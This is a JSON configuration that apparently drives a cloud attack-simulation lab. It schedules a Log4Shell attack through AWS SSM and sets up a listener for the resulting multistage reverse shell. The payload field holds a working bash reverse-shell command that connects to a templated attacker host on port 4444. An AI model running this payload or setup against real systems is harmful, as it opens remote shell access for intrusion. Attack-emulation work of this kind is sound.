{
  "context" :  {
    "global": {
      "environment"          : "${ environment }",
      "deployment"           : "${ deployment }"
    },
    "aws" :  {
      "enabled" : true,
      "ssm" :  {
        "attacker": {
          "execute": {
            "docker_log4shell_attack": {
              "enabled": true,
              "attacker_http_port": 8088,
              "attacker_ldap_port": 1389,
              "attacker_ip": "log4j-attacker-${ deployment }.${ dynu_dns_domain }",
              "target_port": 8080,
              "payload": "/bin/bash -c \"TASK=instance2rds /bin/bash -i >& /dev/tcp/log4j-attacker-${ deployment }.${ dynu_dns_domain }/4444 0>&1\" | tee /tmp/log.txt",
              "attack_delay": 50400,
              "reverse_shell_port": 4444
            }
          },
          "responder": {
            "reverse_shell_multistage": {
              "enabled": true,
              "listen_ip": "0.0.0.0",
              "listen_port": "4444",
              "payload": "touch /tmp/multistage_pwned"
            }
          }
        }
      }
    }
  }
}